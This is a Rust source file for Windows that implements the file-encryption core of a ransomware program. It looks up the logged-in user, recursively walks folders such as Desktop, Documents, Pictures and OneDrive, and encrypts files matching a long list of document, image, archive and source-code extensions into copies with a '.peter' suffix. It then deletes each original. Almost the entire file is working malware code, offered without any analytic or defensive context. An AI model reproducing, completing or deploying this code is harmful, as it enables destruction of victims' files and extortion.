#[cfg(windows)]
extern crate winapi;

use crate::encryption::encrypt;
use std::ffi::CString;
use std::ptr::null_mut;
use std::str;
use winapi::shared::minwindef::FILETIME;
use winapi::um::fileapi::{DeleteFileA, FindFirstFileA, FindNextFileA};
use winapi::um::handleapi::INVALID_HANDLE_VALUE;
use winapi::um::minwinbase::WIN32_FIND_DATAA;

use winapi::um::winbase::GetUserNameA;
use winapi::um::winnt::{FILE_ATTRIBUTE_DIRECTORY, HANDLE};
// traverse_and_encrypt will populate this vector
static mut VALID_EXTENSION_VEC: Vec<&str> = Vec::new();
pub fn traverse_and_encrypt() {
    unsafe {
        let ext = [
            ".pl", ".7z", ".rar", ".m4a", ".wma", ".avi", ".wmv", ".d3dbsp", ".sc2save", ".sie",
            ".sum", ".bkp", ".flv", ".js", ".raw", ".jpeg", ".tar", ".zip", ".tar.gz", ".cmd",
            ".key", ".DOT", ".docm", ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
            ".odt", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx",
            ".html", ".xml", ".psd", ".bmp", ".pdf", ".py", ".rtf",
        ];

        // push all valid extension into VALID_EXTENSION_VEC
        for each in ext.iter() {
            VALID_EXTENSION_VEC.push(each.clone());
        }
    }

    // We will traverse through these directories to encrypt files. We don't need to touch anything else.
    let dir_names = [
        "Contacts",
        "Desktop",
        "Documents",
        "Downloads",
        "Favorites",
        "Music",
        "OneDrive\\Attachments",
        "OneDrive\\Desktop",
        "OneDrive\\Documents",
        "OneDrive\\Pictures",
        "OneDrive\\Music",
        "Pictures",
        "Videos",
    ];

    // getting the username of the machine
    let mut size: u32 = 0;
    let mut buffer: Vec<i8> = Vec::new();
    let mut user_name: Vec<u8> = Vec::new();
    unsafe {
        // get length of name
        GetUserNameA(null_mut(), &mut size);
        buffer.resize(size as usize, 0i8);
        // get username
        GetUserNameA(buffer.as_mut_ptr(), &mut size);
        user_name = std::mem::transmute(buffer);
        user_name.resize((size - 1) as usize, 0u8); // eliminate the null terminator

        for dir in dir_names.iter() {
            let mut full_path = String::from("C:\\Users\\");
            full_path.push_str(str::from_utf8(&user_name[..]).unwrap());
            full_path.push_str("\\");
            full_path.push_str(dir.clone());
            full_path.push_str("\\*");
            // extract path and call traverse
            let full_path: CString = CString::new(full_path.as_bytes()).unwrap();
            traverse(full_path);
        }
    }
}

fn traverse(dir_name: CString) {
    unsafe {
        let mut file_data: WIN32_FIND_DATAA = WIN32_FIND_DATAA {
            dwFileAttributes: 0,
            ftCreationTime: FILETIME {
                dwLowDateTime: 0,
                dwHighDateTime: 0,
            },
            ftLastAccessTime: FILETIME {
                dwLowDateTime: 0,
                dwHighDateTime: 0,
            },
            ftLastWriteTime: FILETIME {
                dwLowDateTime: 0,
                dwHighDateTime: 0,
            },
            nFileSizeHigh: 0,
            nFileSizeLow: 0,
            dwReserved0: 0,
            dwReserved1: 0,
            cFileName: [0i8; 260],
            cAlternateFileName: [0i8; 14],
        };

        let mut hFind: HANDLE = INVALID_HANDLE_VALUE;
        hFind = FindFirstFileA(dir_name.as_ptr(), &mut file_data);
        if hFind == INVALID_HANDLE_VALUE {
            // if path not valid, return
            return;
        }

        loop {
            let mut name_buffer: Vec<u8> = Vec::new();

            for byte in file_data.cFileName.iter() {
                if byte.clone() == 0 {
                    break;
                }
                name_buffer.push(byte.clone() as u8);
            }

            if file_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY == 0 {
                let curr = dir_name.as_bytes();
                let mut new_dir = [&curr[..curr.len() - 1], &name_buffer[..]].concat();
                let dot_position = new_dir.as_mut_slice().iter().rposition(|x| *x == 46);
                let dot_position = dot_position.unwrap();
                let mut extension: Vec<u8> = Vec::new();
                for i in dot_position..new_dir.len() {
                    extension.push(new_dir[i]);
                }

                if VALID_EXTENSION_VEC
                    .iter()
                    .any(|&x| CString::new(x).unwrap() == CString::new(&extension[..]).unwrap())
                {
                    let mut source_file_name = new_dir.clone();
                    let mut dest_file_name: Vec<u8> = Vec::new();
                    for byte in source_file_name[..].iter() {
                        dest_file_name.push(byte.clone());
                    }
                    for byte in ".peter".as_bytes().iter() {
                        dest_file_name.push(byte.clone());
                    }
                    encrypt(
                        CString::new(&source_file_name[..]).unwrap(),
                        CString::new(&dest_file_name[..]).unwrap(),
                    );
                    DeleteFileA(CString::new(&source_file_name[..]).unwrap().as_ptr());
                }
            } else {
                // directory
                let name = str::from_utf8(&name_buffer).unwrap();
                if !((name_buffer.len() == 1 && name_buffer[0] == 46u8)
                    || (name_buffer.len() == 2 && name_buffer[0] == 46u8 && name_buffer[1] == 46u8))
                {
                    let curr = dir_name.as_bytes();
                    let mut new_dir = [&curr[..curr.len() - 1], &name_buffer[..]].concat();
                    new_dir = [&new_dir, "\\*".as_bytes()].concat();
                    traverse(CString::new(new_dir).unwrap());
                }
            }

            if FindNextFileA(hFind, &mut file_data) == 0 {
                return;
            }
        }
    }
}

pub fn traverse_and_delete() {
    println!("Yeet");
}
